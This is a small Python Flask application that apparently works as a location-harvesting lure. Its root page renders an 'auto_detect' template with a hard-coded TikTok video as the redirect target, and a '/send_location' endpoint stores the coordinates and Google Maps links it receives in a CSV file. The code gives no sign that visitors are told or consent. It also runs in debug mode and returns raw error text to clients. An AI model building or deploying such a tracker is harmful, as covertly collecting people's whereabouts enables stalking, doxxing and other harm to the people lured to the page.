import csv
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

# Predefined destination link
DESTINATION_LINK = "https://www.tiktok.com/@muba.a.e.p/video/7518754903993355526?q=geso%20&t=1757777783370"

# CSV file to store location data
CSV_FILE = 'locations.csv'

# Route to detect location and redirect
@app.route('/')
def home():
    return render_template('auto_detect.html', redirect_link=DESTINATION_LINK)

# Handle the location data sent from the front-end
@app.route('/send_location', methods=['POST'])
def receive_location():
    try:
        # Get location data from the request
        data = request.json
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        google_maps_link = data.get('googleMapsLink')

        # Log the received data
        print(f"Received Location: Latitude={latitude}, Longitude={longitude}, Link={google_maps_link}")

        # Save the data to a CSV file
        with open(CSV_FILE, mode='a', newline='') as file:
            writer = csv.writer(file)
            writer.writerow([latitude, longitude, google_maps_link])

        return jsonify({"message": "Location saved successfully!"})
    except Exception as e:
        return jsonify({
            "message": "An error occurred while saving the location.",
            "error": str(e)
        }), 400

if __name__ == "__main__":
    app.run(debug=True)
